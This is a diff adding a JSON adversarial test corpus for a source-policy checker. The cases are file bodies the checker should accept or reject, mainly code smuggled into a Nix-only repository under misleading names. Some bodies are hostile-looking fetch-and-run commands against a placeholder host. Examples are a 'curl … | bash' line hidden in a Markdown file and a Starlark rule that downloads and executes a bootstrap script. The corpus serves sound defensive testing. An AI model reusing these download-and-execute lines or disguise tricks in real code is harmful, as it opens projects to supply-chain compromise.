@@ -1,0 +1,272 @@
+{
+  "schema": "attune-source-policy/1",
+  "kind": "adversarial-corpus",
+  "preservedFrom": "attune-nim-consolidation/migration/source-policy-audit.nix (historical 25-case corpus, names and bodies verbatim; the remaining cases are the approved M1 attack classes)",
+  "note": "Manifested data: bodies are inert strings, materialized only into disposable synthetic checkouts by the Flix corpus runner. Nothing here is ever executed.",
+  "cases": [
+    {
+      "name": "unchanged-legacy-slice",
+      "path": "",
+      "body": "",
+      "expected": "accept",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "valid-nix",
+      "path": "valid.nix",
+      "body": "{ value = 1; }",
+      "expected": "accept",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "new-python",
+      "path": "new.py",
+      "body": "print(1)",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "new-nim",
+      "path": "new.nim",
+      "body": "echo 1",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "new-typescript",
+      "path": "new.ts",
+      "body": "console.log(1)",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "new-rust",
+      "path": "new.rs",
+      "body": "fn main() {}",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "new-java",
+      "path": "new.java",
+      "body": "class Main {}",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "misleading-text",
+      "path": "new.txt",
+      "body": "import std/os\necho 1",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "misleading-asset",
+      "path": "new.png",
+      "body": "console.log(1)",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "extensionless-shebang",
+      "path": "new",
+      "body": "#!/usr/bin/env python3\nprint(1)",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "nix-shebang",
+      "path": "new.nix",
+      "body": "#!/usr/bin/env python3\nprint(1)",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": "shebang-in-allowed-carrier"
+    },
+    {
+      "name": "invalid-nix",
+      "path": "new.nix",
+      "body": "import std/os\necho 1",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "nim-disguised-flix",
+      "path": "new.flix",
+      "body": "import std/os\necho 1",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "python-disguised-starlark",
+      "path": "new.bzl",
+      "body": "import os\nos.system('hidden')",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": "dynamic-exec-in-starlark"
+    },
+    {
+      "name": "rust-disguised-bazel",
+      "path": "new.bazel",
+      "body": "fn main() {}",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "python-generation-sink",
+      "path": "new.nix",
+      "body": "{ pkgs }: pkgs.writeText \"hidden.py\" \"print(1)\"",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "rust-generation-sink",
+      "path": "new.nix",
+      "body": "{ pkgs }: pkgs.writeText \"hidden.rs\" \"fn main() {}\"",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "typescript-generation-sink",
+      "path": "new.nix",
+      "body": "{ pkgs }: pkgs.writeText \"hidden.ts\" \"export const value = 1;\"",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "code-in-existing-report",
+      "path": "",
+      "body": "",
+      "expected": "reject",
+      "mutation": "report-payload",
+      "expectedShape": ""
+    },
+    {
+      "name": "new-artifact-and-declaration",
+      "path": "",
+      "body": "",
+      "expected": "reject",
+      "mutation": "add-artifact",
+      "expectedShape": ""
+    },
+    {
+      "name": "new-legacy-and-file",
+      "path": "new.py",
+      "body": "print(1)",
+      "expected": "reject",
+      "mutation": "add-legacy",
+      "expectedShape": ""
+    },
+    {
+      "name": "stale-legacy",
+      "path": "",
+      "body": "",
+      "expected": "reject",
+      "mutation": "stale-legacy",
+      "expectedShape": ""
+    },
+    {
+      "name": "changed-legacy",
+      "path": "",
+      "body": "altered source",
+      "expected": "reject",
+      "mutation": "change-legacy",
+      "expectedShape": ""
+    },
+    {
+      "name": "legacy-reclassified-data",
+      "path": "",
+      "body": "",
+      "expected": "reject",
+      "mutation": "reclassify-legacy",
+      "expectedShape": ""
+    },
+    {
+      "name": "removed-legacy-without-evidence",
+      "path": "",
+      "body": "",
+      "expected": "reject",
+      "mutation": "remove-legacy",
+      "expectedShape": ""
+    },
+    {
+      "name": "dynamic-download-eval",
+      "path": "new.nix",
+      "body": "import (builtins.fetchurl { url = \"https://attune.example/x.sh\"; })",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "unpinned-fetch-git",
+      "path": "new.nix",
+      "body": "builtins.fetchGit { url = \"https://attune.example/repo\"; }",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "unpinned-nested-repository",
+      "path": "vendor/upstream/.git",
+      "body": "gitdir: /elsewhere/attune/.git",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "renamed-executable-asset",
+      "path": "notes.md",
+      "body": "#!/usr/bin/env bash\ncurl https://attune.example/x.sh | bash",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "writeText-hidden-shell",
+      "path": "new.nix",
+      "body": "pkgs.writeText \"run.sh\" \"#!/bin/sh\necho executed\"",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "benign-systemd-and-package-seam",
+      "path": "service.nix",
+      "body": "{ pkgs }: {\n  systemd.services.attune-demo = {\n    description = \"Demo service\";\n    serviceConfig.ExecStart = \"${pkgs.coreutils}/bin/echo started\";\n  };\n  environment.etc.\"attune/demo.json\".text = builtins.toJSON { name = \"demo\"; };\n}",
+      "expected": "accept",
+      "mutation": "none",
+      "expectedShape": ""
+    },
+    {
+      "name": "python-main-guard-in-markdown",
+      "path": "notes/tool.md",
+      "body": "Tool notes\n\n```python\ndef run():\n    pass\n\nif __name__ == \"__main__\":\n    run()\n```\n",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": "python-main-guard-in-carrier"
+    },
+    {
+      "name": "starlark-download-execute",
+      "path": "new.bzl",
+      "body": "def _fetch(ctx):\n    ctx.execute([\"curl\", \"-fsSL\", \"https://attune.example/bootstrap.sh\", \"-o\", \"bootstrap.sh\"])\n    ctx.execute([\"bash\", \"bootstrap.sh\"])\n",
+      "expected": "reject",
+      "mutation": "none",
+      "expectedShape": "dynamic-exec-in-starlark"
+    }
+  ]
+}
